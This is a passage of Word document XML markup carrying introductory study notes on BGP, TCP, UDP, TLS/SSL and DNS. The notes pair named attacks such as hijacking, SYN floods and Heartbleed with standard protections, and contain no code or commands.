    <w:p w14:paraId="2AC380CB" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Path Selection: Shortest AS path, Local Preference, MED, etc. are applied to select the best route.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2930B840" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Maintaining Sessions: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Keepalive</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> messages maintain session, Notification messages handle errors.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D19342F" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="009B2E17">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="14" w:name="_Toc208408485"/>
      <w:r>
        <w:t>BGP Message Types:</w:t>
      </w:r>
      <w:bookmarkEnd w:id="14"/>
    </w:p>
    <w:p w14:paraId="5AF3CD1C" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Open: Establish neighbor relationship</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56108370" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Update: Advertises or withdraws routes</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="528F387A" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Keepalive</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>: Confirms session is active</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B768386" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Notification: Handles errors</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CA09866" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="009B2E17">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="15" w:name="_Toc208408486"/>
      <w:r>
        <w:t>Types:</w:t>
      </w:r>
      <w:bookmarkEnd w:id="15"/>
    </w:p>
    <w:p w14:paraId="68037065" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>eBGP</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> (External BGP): Between </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>ASes</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="66FBCFE5" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>iBGP</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> (Internal BGP): Within AS</w:t>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w14:paraId="65637209" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="009B2E17">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="16" w:name="_Toc208408487"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Security Issues &amp; Attacks:</w:t>
      </w:r>
      <w:bookmarkEnd w:id="16"/>
    </w:p>
    <w:p w14:paraId="331AA80D" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>BGP Hijacking</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20ADB9F7" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Route Leaks</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43C3F7E5" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>MITM at routing level</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5009EAC0" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="009B2E17">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="17" w:name="_Toc208408488"/>
      <w:r>
        <w:t>Protections:</w:t>
      </w:r>
      <w:bookmarkEnd w:id="17"/>
    </w:p>
    <w:p w14:paraId="277FAA6F" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>RPKI (Resource Public Key Infrastructure)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67BA2044" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Route filtering</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A74B687" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Monitoring tools like </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>BGPMon</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="1A8B537A" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="009B2E17">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="18" w:name="_Toc208408489"/>
      <w:r>
        <w:t>Transmission Control Protocol (TCP)</w:t>
      </w:r>
      <w:bookmarkEnd w:id="18"/>
    </w:p>
    <w:p w14:paraId="6E0E4184" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>TCP is a Layer 4 (Transport Layer) protocol that provides reliable, connection-oriented, byte-stream communication between applications.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33F448C2" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="009B2E17">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="19" w:name="_Toc208408490"/>
      <w:r>
        <w:t>How TCP Works:</w:t>
      </w:r>
      <w:bookmarkEnd w:id="19"/>
    </w:p>
    <w:p w14:paraId="3D981238" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Connection Establishment (3-way handshake): SYN → SYN-ACK → ACK</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DFFBCB9" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Data Transfer: Uses sequence numbers and acknowledgements</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26F7B889" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Flow &amp; Congestion Control: Sliding window, congestion avoidance</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="086F2382" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Connection Termination: FIN/ACK or RST</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AB1ED7F" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="009B2E17">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="20" w:name="_Toc208408491"/>
      <w:r>
        <w:t>TCP Segment Format:</w:t>
      </w:r>
      <w:bookmarkEnd w:id="20"/>
    </w:p>
    <w:p w14:paraId="06F0EE9E" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Source &amp; Destination Ports</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63FECFD4" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Sequence &amp; Acknowledgement numbers</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4177ED34" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Flags (SYN, ACK, FIN, RST)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30D3C107" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Window size, Checksum, Options</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46A0FAEA" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="009B2E17">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="21" w:name="_Toc208408492"/>
      <w:r>
        <w:t>Security Issues:</w:t>
      </w:r>
      <w:bookmarkEnd w:id="21"/>
    </w:p>
    <w:p w14:paraId="28C6C6E4" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">SYN Flood </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>DoS</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="6CC8D12C" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Session Hijacking</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F0D7599" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>TCP Reset Attacks</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72656F15" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Protection:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38636640" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>SYN Cookies</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58567533" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Randomized ISNs</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07DAF81A" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>IDS/IPS monitoring</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
    </w:p>
    <w:p w14:paraId="766CB75D" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="22" w:name="_Toc208408493"/>
      <w:r>
        <w:t>User Datagram Protocol (UDP)</w:t>
      </w:r>
      <w:bookmarkEnd w:id="22"/>
    </w:p>
    <w:p w14:paraId="43C35449" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>UDP is a Layer 4 (Transport Layer) protocol providing fast, connectionless communication without guarantees for reliability or order.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="378544C5" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="009B2E17">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="23" w:name="_Toc208408494"/>
      <w:r>
        <w:t>How UDP Works:</w:t>
      </w:r>
      <w:bookmarkEnd w:id="23"/>
    </w:p>
    <w:p w14:paraId="0EAC01A7" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>No handshake, sender adds source/destination ports, length, checksum</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77C80D1A" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Receiver processes packet if it arrives</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50AB8971" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="009B2E17">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="24" w:name="_Toc208408495"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>UDP Segment Format:</w:t>
      </w:r>
      <w:bookmarkEnd w:id="24"/>
    </w:p>
    <w:p w14:paraId="5FC49C93" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Source Port</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14B79C28" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Destination Port</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62EE5B75" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Length</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D3788CB" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Checksum</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0687C62A" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="009B2E17">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="25" w:name="_Toc208408496"/>
      <w:r>
        <w:t>Characteristics:</w:t>
      </w:r>
      <w:bookmarkEnd w:id="25"/>
    </w:p>
    <w:p w14:paraId="21C9FAD2" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Low overhead, faster than TCP</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CA821A7" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Supports multicast/broadcast</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="391FFBEE" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="009B2E17">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="26" w:name="_Toc208408497"/>
      <w:r>
        <w:t>Security Issues:</w:t>
      </w:r>
      <w:bookmarkEnd w:id="26"/>
    </w:p>
    <w:p w14:paraId="1B10A165" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">UDP Flood </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>DoS</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="680C618D" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Amplification attacks (DNS/NTP)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E075176" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Spoofing</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39CD03A5" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="009B2E17">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="27" w:name="_Toc208408498"/>
      <w:r>
        <w:t>Protections:</w:t>
      </w:r>
      <w:bookmarkEnd w:id="27"/>
    </w:p>
    <w:p w14:paraId="09119A60" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Rate limiting</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="035C08A8" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Firewalls</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CC4B5D9" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>DTLS/QUIC for secure UDP</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2181351A" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Real-World Use: DNS, DHCP, TFTP, SNMP, VoIP, gaming, streaming.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74DEF63E" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="28" w:name="_Toc208408499"/>
      <w:r>
        <w:t>TLS/SSL (Transport Layer Security / Secure Sockets Layer)</w:t>
      </w:r>
      <w:bookmarkEnd w:id="28"/>
    </w:p>
    <w:p w14:paraId="28999386" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>TLS/SSL is a Layer 6 (Presentation Layer) protocol for secure communication providing encryption, authentication, and integrity.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26BD3DD8" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="009B2E17">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="29" w:name="_Toc208408500"/>
      <w:r>
        <w:t>How It Works:</w:t>
      </w:r>
      <w:bookmarkEnd w:id="29"/>
    </w:p>
    <w:p w14:paraId="44FA49DB" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Handshake: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>ClientHello</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>ServerHello</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>, key exchange, certificate exchange</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50F02DD9" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Session Key Generation: Establish shared secret</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="291BCF20" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Data Transfer: Encrypted application data</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AE5CAAE" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="009B2E17">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="30" w:name="_Toc208408501"/>
      <w:r>
        <w:t>TLS Record Format:</w:t>
      </w:r>
      <w:bookmarkEnd w:id="30"/>
    </w:p>
    <w:p w14:paraId="4C9D36B3" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Content Type, Version, Length, Encrypted Data</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4648416D" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="009B2E17">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="31" w:name="_Toc208408502"/>
      <w:r>
        <w:t>Ports:</w:t>
      </w:r>
      <w:bookmarkEnd w:id="31"/>
    </w:p>
    <w:p w14:paraId="5D02C89D" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>HTTPS 443, SMTPS 465, IMAPS 993, POP3S 995</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4ED71CF4" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="009B2E17">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="32" w:name="_Toc208408503"/>
      <w:r>
        <w:t>Security Issues:</w:t>
      </w:r>
      <w:bookmarkEnd w:id="32"/>
    </w:p>
    <w:p w14:paraId="2D7EA864" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>SSL Stripping</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F0EBF72" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Heartbleed</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23D35E52" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>POODLE</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7ED62476" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Weak ciphers</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7841B74D" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="009B2E17">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="33" w:name="_Toc208408504"/>
      <w:r>
        <w:t>Protections:</w:t>
      </w:r>
      <w:bookmarkEnd w:id="33"/>
    </w:p>
    <w:p w14:paraId="0C220FAB" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>TLS 1.2/1.3 only</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11BFCEFE" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Disable SSLv2/v3</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06749EC6" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Enforce HSTS</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42FBC3C2" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Real-World: Used in banking, e-commerce, secure logins.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F91BB4C" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:bookmarkStart w:id="34" w:name="_Toc208408505"/>
      <w:r>
        <w:t>Domain Name System (DNS)</w:t>
      </w:r>
      <w:bookmarkEnd w:id="34"/>
    </w:p>
    <w:p w14:paraId="24CB39F0" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>DNS is a Layer 7 (Application Layer) protocol that translates human-readable domain names (like www.google.com) into IP addresses (like 142.250.183.78).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="237A722C" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>It is often called the “phonebook of the Internet.”</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B7ACE7D" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="009B2E17">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="35" w:name="_Toc208408506"/>
      <w:r>
        <w:t>Flowchart for DNS</w:t>
      </w:r>
      <w:bookmarkEnd w:id="35"/>
    </w:p>
    <w:p w14:paraId="6378FE11" w14:textId="62BE3F80" w:rsidR="00BC35DD" w:rsidRPr="00BC35DD" w:rsidRDefault="00BC35DD" w:rsidP="00BC35DD">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="51831A00" wp14:editId="726ECD20">
            <wp:extent cx="5486400" cy="4726305"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="432402843" name="Picture 10" descr="DNS Explained: The Backbone of the Internet - Tech In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NS Explained: The Backbone of the Internet - Tech In The Clou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726305"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B0E8D55" w14:textId="77777777" w:rsidR="00BC35DD" w:rsidRPr="00BC35DD" w:rsidRDefault="00BC35DD" w:rsidP="00BC35DD"/>
    <w:p w14:paraId="21505659" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="009B2E17">
      <w:pPr>
